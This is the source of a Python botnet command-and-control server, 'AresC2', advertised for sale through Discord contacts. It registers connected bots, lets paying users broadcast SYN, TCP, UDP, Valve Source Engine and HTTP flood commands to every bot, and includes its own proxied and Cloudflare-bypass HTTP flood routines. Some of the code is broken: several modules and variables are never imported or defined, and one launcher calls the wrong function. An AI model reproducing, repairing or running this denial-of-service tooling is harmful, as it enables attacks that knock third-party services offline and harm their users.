# 𝓐𝓻𝓮𝓼𝓒𝟐 - A simple Python botnet
# Author: WodX
# Date: 27/09/2019
# CnC server

import random
import threading
import socket
import os,sys
import time
import getpass
from sys import stdout
from colorama import Fore, init
import cloudscraper, datetime, socket, ssl
        
from discord_webhook import DiscordWebhook, DiscordEmbed
import discord
from discord.ext import commands
import random
from discord import Permissions
from colorama import Fore, Style
import asyncio
import os
import datetime
import pytz

bots = {}
ansi_clear = '\033[2J\033[H'

l_banner = """\033[93m █████                          ███               
\033[93m░░███                          ░░░                
\033[93m ░███         ██████   ███████ ████  ████████     
\033[93m ░███        ███░░███ ███░░███░░███ ░░███░░███    
\033[93m ░███       ░███ ░███░███ ░███ ░███  ░███ ░███    
\033[93m ░███      █░███ ░███░███ ░███ ░███  ░███ ░███    
\033[93m ███████████░░██████ ░░███████ █████ ████ █████   
\033[93m░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░    
\033[93m                      ███ ░███                    
\033[93m                     ░░██████                     
\033[93m                      ░░░░░░  
            \033[96m🚀 𝓦𝓮𝓵𝓬𝓸𝓶𝓮 𝓣𝓸 𝓐𝓻𝓮𝓼𝓒2. 𝓜𝓪𝓭𝓮 𝓑𝔂 𝓘𝓽𝔃𝓢𝓮𝓿𝓮𝓷 🚀
            \033[97m
\033[97m   ███
\033[97m  █   █
\033[97m  █   █                     \033[93m🛒 Wanna Buy? DM ItzSeven#9617 Or You Can DM 🛒
\033[97m█████████               ██  \033[93mPushyGamertag27#7165 make Sure You Join
\033[97m█████████              █  █ \033[93mTo Our Server https://discord.aresnet.xyz \033[97m
\033[97m███   ███ ██████████████  █      
\033[97m████ ████ █ █          █  █
\033[97m█████████               ██     \033[33m   

"""

banner = '''\033[97m|\033[95mAresC2\033[97m| \033[91m| VIP ACSESS\033[97m: [\033[92mTRUE\033[97m] |  \033[91mDISCORD\033[97m: [\033[92mItzSeven#3217\033[97m] \033[97m| \033[91mNew Design, Enjoy!~

\033[95m                     ▄▄▄· ▄▄▄  ▄▄▄ ..▄▄ · 
\033[95m                    ▐█ ▀█ ▀▄ █·▀▄.▀·▐█ ▀. 
\033[97m                    ▄█▀▀█ ▐▀▀▄ ▐▀▀▪▄▄▀▀▀█▄
\033[95m                    ▐█ ▪▐▌▐█•█▌▐█▄▄▌▐█▄▪▐█
\033[95m                     ▀  ▀ .▀  ▀ ▀▀▀  ▀▀▀▀ 
\033[95m              \033[91m♥ \033[95m 𝓐𝓻𝓮𝓼𝓒2 𝓜𝓪𝓭𝓮 𝓑𝔂 𝓘𝓽𝔃𝓢𝓮𝓿𝓮𝓷 \033[91m♥
\033[95m        ══╦═════════════════════════════════╦══
\033[95m╔═════════╩═════════════════════════════════╩═════════╗
\033[95m║               ⚡\033[97mWelcome To AresC2⚡                 \033[95m║
\033[95m║ \033[97mType "help" \033[97mFor Help . If you wanna buy AresC2      \033[95m║
\033[95m║ \033[97mContact ItzSeven#3217 / PushyGamertag27#7165        \033[95m║
\033[95m╚═══╦════════════════════════════════════════════╦════╝
\033[95m   ╔╩════════════════════════════════════════════╩╗
\033[95m   ║ How To attack: \033[95m[\033[97mMETHOD\033[95m] \033[95m[\033[97mIP\033[95m] \033[95m[\033[97mPORT\033[95m] [\033[97mTIME\033[95m].  ║
\033[95m   ║ \033[97mCopyrigtht © AresC2 2022 All Rights Reserved \033[95m║
\033[95m   ╚══════════════════════════════════════════════╝

        '''


rules = """
\033[95m╔═══════════════════════════════════════════╗
\033[95m║\033[97m 1. No Attacks Over 120 Seconds.           \033[95m║
\033[95m║\033[97m 2. No Spamming Attacks.                   \033[95m║
\033[95m║\033[97m 3. No Attacks To Any Government Websites. \033[95m║
\033[95m║\033[97m 4. No Sharing Logins.                     \033[95m║
\033[95m║\033[97m 5. No Giving Out The Server IP.           \033[95m║
\033[95m╚═══════════════════════════════════════════╝
"""

def validate_ip(ip):
    """ validate IP-address """
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private
    
def validate_port(port, rand=False):
    """ validate port number """
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

def validate_time(time):
    """ validate attack duration """
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

def validate_size(size):
    """ validate buffer size """
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

def find_login(username, password):
    """ read credentials from logins.txt file """
    credentials = [x.strip() for x in open('logins.txt').readlines() if x.strip()]
    for x in credentials:
        c_username, c_password = x.split(':')
        if c_username.lower() == username.lower() and c_password == password:
            return True
def countdown(t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    while True:
        if (until - datetime.datetime.now()).total_seconds() > 0:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack status => " + str((until - datetime.datetime.now()).total_seconds()) + " sec left ")
        else:
            stdout.flush()
            stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
            return

def get_info():
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"URL     "+Fore.RED+": "+Fore.WHITE)
    target = input()
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"THREAD  "+Fore.RED+": "+Fore.WHITE)
    thread = input()
    stdout.write(Fore.MAGENTA+" [>] "+Fore.WHITE+"TIME(s) "+Fore.RED+": "+Fore.WHITE)
    t = input()
    return target, thread, t
#endregion


def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url, timeout=15)
            scraper.get(url, timeout=15)
        except:
            pass
#endregion

#region PXCFB
def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper))
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = {
                    'http': 'http://'+str(random.choice(list(proxies))),   
                    'https': 'http://'+str(random.choice(list(proxies))),
            }
            scraper.get(url, proxies=proxy)
            scraper.get(url, proxies=proxy)
        except:
            pass
#endregion

def LaunchHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    client = httpx.Client(http2=True)
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def LaunchPXHTTP2(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        threading.Thread(target=AttackHTTP2, args=(url, until)).start()

def AttackPXHTTP2(url, until_datetime):
    headers = {
            'User-Agent': random.choice(ua),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
            'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'TE': 'trailers',
            }
    
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            client = httpx.Client(
                http2=True,
                proxies={
                    'http://': 'http://'+random.choice(proxies),
                    'https://': 'http://'+random.choice(proxies),
                }
             )
            client.get(url, headers=headers)
            client.get(url, headers=headers)
        except:
            pass

def send(socket, data, escape=True, reset=True):
    """ send data to client or bot """
    if reset:
        data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(data.encode())

def broadcast(data):
    """ send command to all bots """
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, f'{data} 32', False, False)
        except:
            dead_bots.append(bot)
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    """ check if all bots are still connected to C2 """
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False, False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def update_title(client, username):
    """ updates the shell title, duh? """
    while 1:
        try:
            send(client, f'\33]0;𝓐𝓻𝓮𝓼𝓒𝟐 | Bots: {len(bots)} | Connected as: {username}\a', False)
            time.sleep(2)
        except:
            client.close()

def command_line(client):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'\033[95m[\033[97mroot@Ares\033[95m]\033[97m~$ \033[37m '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            command = args[0].upper()
            
            if command == 'HELP':
                send(client, '╦ ╦╔═╗╦  ╔═╗  ╔╦╗╔═╗╔╗╔╦ ╦')
                send(client, '╠═╣║╣ ║  ╠═╝  ║║║║╣ ║║║║ ║')
                send(client, '╩ ╩╚═╝╩═╝╩    ╩ ╩╚═╝╝╚╝╚═╝')
                   
                send(client, '╔════════════════════════════════════════╗')
                send(client, '║ rules      -> View the tos             ║')
                send(client, '║ methods    -> View methods page        ║')
                send(client, '║ echo       -> Echo provided text       ║')
                send(client, '║ lookup     -> Lookup an ip             ║')
                send(client, '║ plan       -> View your plan details   ║')
                send(client, '║ clear      -> Clear the terminal       ║')
                send(client, '║ ongoing    -> View ongoing attacks     ║')
                send(client, '║ recent     -> View your last attacks   ║')
                send(client, '║ passwd     -> Change your password     ║')
                send(client, '║ ping       -> ICMP ping an ip          ║')
                send(client, '║ paping     -> TCP ping an ip           ║')
                send(client, '║ cfx        -> Resolve cfx code to ip   ║')
                send(client, '║ themes     -> Change the appearence    ║')
                send(client, '║ encrypt    -> Encrypt provided text    ║')
                send(client, '╚════════════════════════════════════════╝')


            elif command == "RULES":
                send(client, '\033[95m╔═══════════════════════════════════════════╗')
                send(client, '\033[95m║\033[97m 1. No Attacks Over 120 Seconds.           \033[95m║')
                send(client, '\033[95m║\033[97m 2. No Spamming Attacks.                   \033[95m║')
                send(client, '\033[95m║\033[97m 3. No Attacks To Any Government Websites. \033[95m║')
                send(client, '\033[95m║\033[97m 4. No Sharing Logins.                     \033[95m║')
                send(client, '\033[95m║\033[97m 5. No Giving Out The Server IP.           \033[95m║')
                send(client, '\033[95m╚═══════════════════════════════════════════╝')


            elif command == 'METHODS':
                send(client, '.syn: TCP SYN flood')
                send(client, '.tcp: TCP junk flood')
                send(client, '.udp: UDP junk flood')
                send(client, '.vse: UDP Valve Source Engine specific flood')
                send(client, '.http: HTTP GET request flood')
                send(client, '')

            elif command == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif command == 'LOGOUT':
                send(client, 'Goodbye :-)')
                time.sleep(1)
                break

            # Valve Source Engine query flood
            elif command == '.VSE':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .vse [IP] [PORT] [TIME]')

            # TCP SYNchronize flood           
            elif command == '.SYN':
                if len(args) == 4:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .syn [IP] [PORT] [TIME]')
                    send(client, 'Use port 0 for random port mode')
                    
            # TCP junk data packets flood
            elif command == '.TCP':
                if len(args) == 5:
                    ip = args[1]
                    port = args[2]
                    secs = args[3]
                    size = args[4]
                    if validate_ip(ip):
                        if validate_port(port):
                            if validate_time(secs):
                                if validate_size(size):
                                    send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                    broadcast(data)
                                else:
                                    send(client, Fore.RED + 'Invalid packet size (1-65500 bytes)')
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .tcp [IP] [PORT] [TIME] [SIZE]')

            elif command == '.UDP':
                if len(args) == 4:
                    ip = args[1]
                    secs = args[2]
                    port = args[3]
                    if validate_ip(ip):
                        if validate_port(port, True):
                            if validate_time(secs):
                                send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                        else:
                            send(client, Fore.RED + 'Invalid port number (1-65535)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .udp [IP] [TIME] [PORT]')
                    send(client, 'Use port 0 for random port mode')
                
            # HTTP GET request flood
            elif command == '.HTTP':
                if len(args) == 3:
                    ip = args[1]
                    secs = args[2]
                    if validate_ip(ip):
                        if validate_time(secs):
                            send(client, Fore.GREEN + f'Attack sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                            broadcast(data)
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .http [IP] [TIME]')
            else:
                send(client, Fore.WHITE + '[404] Unknown Command')

            send(client, prompt, False)
        except:
            break
    client.close()

def handle_client(client, address):
    send(client, f'\33]0;𝓐𝓻𝓮𝓼𝓒𝟐 | Login\a', False)

    # username login
    while 1:
        send(client, ansi_clear, False)
        send(client, ansi_clear, False)
        for x in l_banner.split('\n'):
            send(client, '\x1b[3;31;40m'+x)
        send(client, f'{Fore.LIGHTBLUE_EX}Username{Fore.LIGHTWHITE_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, ansi_clear, False)
        for x in l_banner.split('\n'):
            send(client, '\x1b[3;31;40m'+x)
        send(client, f'{Fore.LIGHTBLUE_EX}Password{Fore.LIGHTWHITE_EX}:{Fore.BLACK} ', False, False)
        while not password.strip(): # i know... this is ugly...
            password = client.recv(1024).decode('cp1252').strip()
        break
        
    # handle client
    if password != '\xff\xff\xff\xff\75':
        send(client, ansi_clear, False)

        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()

    # handle bot
    else:
        # check if bot is already connected
        for x in bots.values():
            if x[0] == address[0]:
                client.close()
                return
        bots.update({client: address})
    
def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <c2 port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid C2 port')
        exit()
    port = int(port)
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
    except:
        print('Failed to bind port')
        exit()

    sock.listen()

    threading.Thread(target=ping).start() # start keepalive thread

    # accept all connections
    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()
